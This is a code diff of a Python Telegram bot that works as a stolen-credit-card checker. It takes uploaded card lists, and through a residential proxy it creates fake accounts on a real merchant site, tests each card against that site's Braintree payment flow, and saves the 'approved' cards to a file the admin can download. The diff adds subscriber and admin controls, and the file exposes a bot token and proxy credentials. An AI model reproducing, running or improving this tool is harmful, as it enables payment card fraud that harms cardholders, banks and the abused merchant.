@@ -4,7 +4,6 @@ import time
 from telebot import types
 import os
 import random
-from datetime import datetime
 import re
 import json
 import base64
@@ -14,8 +13,14 @@ from bs4 import BeautifulSoup
 token = '7721695960:AAFsFNtx-Nne2lKgig8HBaA2H3nyLcPAkZ8'
 bot = telebot.TeleBot(token, parse_mode="HTML")
 
+# Admin ID
+admin_id = '6775748231'
+
+# File to store subscribers
+SUBSCRIBERS_FILE = 'subscribers.json'
+
 # List of authorized subscriber IDs
-subscribers = ['6775748231']  # Add more subscriber IDs here
+subscribers = []
 
 # Proxy configuration
 PROXY = {
@@ -23,12 +28,100 @@ PROXY = {
     'https': 'http://k9xpmz64oxn8o6h-country-us:vgyg55mrlahbujv@rp.scrapegw.com:6060',
 }
 
+# Load subscribers from JSON file
+def load_subscribers():
+    global subscribers
+    try:
+        if os.path.exists(SUBSCRIBERS_FILE):
+            with open(SUBSCRIBERS_FILE, 'r') as f:
+                subscribers = json.load(f)
+        else:
+            subscribers = ['6775748231']
+            save_subscribers()
+    except Exception:
+        subscribers = ['6775748231']
+        save_subscribers()
+
+# Save subscribers to JSON file
+def save_subscribers():
+    try:
+        with open(SUBSCRIBERS_FILE, 'w') as f:
+            json.dump(subscribers, f)
+    except Exception:
+        pass
+
+# Initialize subscribers
+load_subscribers()
+
 @bot.message_handler(commands=["start"])
 def start(message):
     if str(message.chat.id) not in subscribers:
         bot.reply_to(message, "Only for authorized users 🙄💗")
         return
     bot.reply_to(message, "Send the file now")
+
+@bot.message_handler(commands=["adduser"])
+def add_user(message):
+    if str(message.chat.id) != admin_id:
+        bot.reply_to(message, "You are not authorized to use this command!")
+        return
+    try:
+        user_id = message.text.split()[1]
+        if not user_id.isdigit():
+            bot.reply_to(message, "Invalid user ID. Please provide a numeric Telegram user ID.")
+            return
+        if user_id in subscribers:
+            bot.reply_to(message, f"User {user_id} is already authorized.")
+            return
+        subscribers.append(user_id)
+        save_subscribers()
+        bot.reply_to(message, f"User {user_id} has been added to authorized users.")
+    except IndexError:
+        bot.reply_to(message, "Please provide a user ID. Usage: /adduser <code>user_id</code>")
+
+@bot.message_handler(commands=["removeuser"])
+def remove_user(message):
+    if str(message.chat.id) != admin_id:
+        bot.reply_to(message, "You are not authorized to use this command!")
+        return
+    try:
+        user_id = message.text.split()[1]
+        if not user_id.isdigit():
+            bot.reply_to(message, "Invalid user ID. Please provide a numeric Telegram user ID.")
+            return
+        if user_id not in subscribers:
+            bot.reply_to(message, f"User {user_id} is not in the authorized list.")
+            return
+        subscribers.remove(user_id)
+        save_subscribers()
+        bot.reply_to(message, f"User {user_id} has been removed from authorized users.")
+    except IndexError:
+        bot.reply_to(message, "Please provide a user ID. Usage: /removeuser <code>user_id</code>")
+
+@bot.message_handler(commands=["listusers"])
+def list_users(message):
+    if str(message.chat.id) != admin_id:
+        bot.reply_to(message, "You are not authorized to use this command!")
+        return
+    if not subscribers:
+        bot.reply_to(message, "No authorized users found.")
+        return
+    users_list = "\n".join(subscribers)
+    bot.reply_to(message, f"Authorized Users:\n{users_list}")
+
+@bot.message_handler(commands=["getfile"])
+def get_file(message):
+    if str(message.chat.id) != admin_id:
+        bot.reply_to(message, "You are not authorized to use this command!")
+        return
+    if not os.path.exists("approved.txt"):
+        bot.reply_to(message, "No approved cards file found.")
+        return
+    try:
+        with open("approved.txt", "rb") as f:
+            bot.send_document(message.chat.id, f, caption="Approved Cards")
+    except Exception as e:
+        bot.reply_to(message, f"Error sending file: {e}")
 
 def get_bin_info(bin_number):
     try:
@@ -41,8 +134,7 @@ def get_bin_info(bin_number):
             "country_name": req.get("country_name", "Unknown"),
             "country_flag": req.get("country_flag", ""),
         }
-    except Exception as e:
-        print(f"Error fetching bin info: {e}")
+    except Exception:
         return {
             "brand": "Unknown",
             "card_type": "Unknown",
@@ -60,23 +152,9 @@ def gets(s, start, end):
     except ValueError:
         return None
 
-# Function to save approved CC to approved.txt
 def save_approved_cc(fullcc, bin_info, reason):
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    entry = (
-        f"[{timestamp}]\n"
-        f"Card: {fullcc}\n"
-        f"Status: Approved ✅\n"
-        f"Result: {reason}\n"
-        f"Gateway: Braintree Auth\n"
-        f"BIN: {bin_info['brand']} - {bin_info['card_type']}\n"
-        f"Country: {bin_info['country_name']} - {bin_info['country_flag']}\n"
-        f"Bank: {bin_info['bank']}\n"
-        f"----------------------------------------\n"
-    )
-    # Append to file with thread-safety
     with open("approved.txt", "a", encoding="utf-8") as f:
-        f.write(entry)
+        f.write(f"{fullcc}\n")
 
 @bot.message_handler(content_types=["document"])
 def main(message):
@@ -84,11 +162,10 @@ def main(message):
         bot.reply_to(message, "Only for authorized users 🙄💗")
         return
     
-    dd = 0  # Declined count
-    live = 0  # Approved count
+    dd = 0
+    live = 0
     ko = bot.reply_to(message, "Checking Your Cards...⌛").message_id
     
-    # Download the uploaded file
     try:
         ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
         with open("combo.txt", "wb") as w:
@@ -100,23 +177,39 @@ def main(message):
     try:
         with open("combo.txt", 'r') as file:
             lino = file.readlines()
-            total = len(lino)
-            for cc in lino:
+            cleaned_lino = []
+            for line in lino:
+                parts = line.strip().split("|")
+                if len(parts) == 4:
+                    parts[0] = re.sub(r'[^0-9]', '', parts[0])
+                    cleaned_lino.append("|".join(parts))
+            total = len(cleaned_lino)
+            for cc in cleaned_lino:
                 cc = cc.strip()
                 if not cc:
                     continue
                 
-                # Check for stop signal
                 current_dir = os.getcwd()
                 for filename in os.listdir(current_dir):
                     if filename.endswith(".stop"):
-                        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @BhonePyaeThuKitaro')
+                        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @CODExHYPER')
                         os.remove('stop.stop')
                         return
                 
-                # Split CC details
                 try:
                     cc_num, mm, yy, cvc = cc.split("|")
+                    cc_num = re.sub(r'[^0-9]', '', cc_num)
+                    if cc_num.startswith('34') or cc_num.startswith('37'):
+                        valid_length = 15
+                    elif cc_num.startswith('30') or cc_num.startswith('36') or cc_num.startswith('38'):
+                        valid_length = 14
+                    else:
+                        valid_length = range(12, 20)
+                    if (isinstance(valid_length, int) and len(cc_num) != valid_length) or \
+                       (isinstance(valid_length, range) and len(cc_num) not in valid_length):
+                        dd += 1
+                        last = f"Decline ❌ - Invalid card number length ({len(cc_num)} digits)"
+                        continue
                 except ValueError:
                     dd += 1
                     last = "Decline ❌ - Invalid Format"
@@ -126,11 +219,9 @@ def main(message):
                 bin_number = cc_num[:6]
                 bin_info = get_bin_info(bin_number)
                 
-                # Braintree checking logic starts here
                 session = requests.Session()
                 session.proxies.update(PROXY)
                 
-                # Step 1: Get registration nonce
                 headers = {
                     'authority': 'oceansgarden.com',
                     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -154,7 +245,6 @@ def main(message):
                     last = f"Decline ❌ - Failed to get nonce: {e}"
                     continue
                 
-                # Step 2: Register account
                 mail = "cristniki" + str(random.randint(9999, 574545)) + "@gmail.com"
                 headers = {
                     'authority': 'www.oceansgarden.com',
@@ -204,7 +294,6 @@ def main(message):
                     last = f"Decline ❌ - Account registration failed: {e}"
                     continue
                 
-                # Step 3: Get payment method page
                 headers = {
                     'authority': 'www.oceansgarden.com',
                     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -227,7 +316,6 @@ def main(message):
                     last = f"Decline ❌ - Failed to load payment page: {e}"
                     continue
                 
-                # Extract client token and nonce
                 client_token = re.search(r'var wc_braintree_client_token = \[(".*?")\]', response.text)
                 pay = re.search(r'input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="([^"]+)"', response.text)
                 
@@ -242,7 +330,6 @@ def main(message):
                         dd += 1
                         last = f"Decline ❌ - Token decoding error: {e}"
                     else:
-                        # Step 4: Tokenize credit card and get API response
                         headers = {
                             'Accept': '*/*',
                             'Authorization': f'Bearer {autho}',
@@ -292,7 +379,6 @@ def main(message):
                                 if "CVV" in reason.upper():
                                     last = "Approved ✅ - CVV Issue"
                                     live += 1
-                                    # Save to approved.txt
                                     save_approved_cc(fullcc, bin_info, reason)
                                 else:
                                     last = f"Decline ❌ - {reason}"
@@ -304,7 +390,6 @@ def main(message):
                             token = None
                         
                         if token:
-                            # Step 5: Add payment method
                             headers = {
                                 'authority': 'www.oceansgarden.com',
                                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -341,7 +426,6 @@ def main(message):
                                 if not error_message:
                                     last = "Approved ✅ - Success"
                                     live += 1
-                                    # Save to approved.txt
                                     save_approved_cc(fullcc, bin_info, "Success")
                                 else:
                                     reason = error_message.text.strip()
@@ -350,7 +434,6 @@ def main(message):
                                     if "CVV" in reason.upper():
                                         last = f"Approved ✅ - {reason}"
                                         live += 1
-                                        # Save to approved.txt
                                         save_approved_cc(fullcc, bin_info, reason)
                                     else:
                                         last = f"Decline ❌ - {reason}"
@@ -362,10 +445,8 @@ def main(message):
                     dd += 1
                     last = "Decline ❌ - Token Extraction Failed"
                 
-                # Extract just the reason for the inline status
                 reason_only = last.split(" - ", 1)[1] if " - " in last else last
                 
-                # Update Telegram message with only the reason in status
                 mes = types.InlineKeyboardMarkup(row_width=1)
                 cm1 = types.InlineKeyboardButton(f"• {fullcc} •", callback_data='u8')
                 status = types.InlineKeyboardButton(f"• 𝗦𝗧𝗔𝗧𝗨𝗦 ➜ {reason_only} •", callback_data='u8')
@@ -377,12 +458,11 @@ def main(message):
                 bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''Wait for processing 
 𝒃𝒚 ➜ @CODExHYPER ''', reply_markup=mes)
                 
-                # Send approval message
                 if "Approved ✅" in last:
-                    msg = f'''◆ 𝑪𝑨𝑹𝑫  ➜ {fullcc} 
+                    msg = f'''◆ 𝑪𝑨𝑹𝑫  ➜ <code>{fullcc}</code> 
 ◆ 𝑺𝑻𝑨𝑻𝑼𝑺 ➜ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅
 ◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ 𝘾𝘼𝙍𝘿 𝘼𝘿𝘿𝙀𝘿 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔 《{last.split(' - ')[1] if ' - ' in last else 'Success'}》
-◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ 𝘽𝙍𝘼𝙄𝙁𝙉𝙏𝙍𝙀𝙀 𝘼𝙐𝙏𝙃
+◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ 𝘽𝙍𝘼𝙄𝙉𝙏𝙍𝙀𝙀 𝘼𝙐𝙏𝙃
 ━━━━━━━━━━━━━━━━━
 ◆ 𝑩𝑰𝑵 ➜ {bin_number} - {bin_info['brand']} - {bin_info['card_type']}
 ◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {bin_info['country_name']} - {bin_info['country_flag']}
@@ -392,18 +472,17 @@ def main(message):
 ◆𝑷𝑹𝑶𝑿𝒀𝑺: 𝑷𝑹𝑶𝑿𝒀 𝑳𝑰𝑽𝑬 ✅ '''
                     bot.reply_to(message, msg)
                 
-                time.sleep(1)  # Rate limiting
+                time.sleep(1)
                 
     except Exception as e:
-        print(f"Error processing file: {e}")
         bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"Error processing file: {e}")
     
-    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @BhonePyaeThuKitaro')
+    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @CODExHYPER')
 
 @bot.callback_query_handler(func=lambda call: call.data == 'stop')
 def menu_callback(call):
     with open("stop.stop", "w") as file:
         pass
 
-print("+-----------------------------------------------------------------+")
+print("+--------------------------------------------------------+")
 bot.polling()
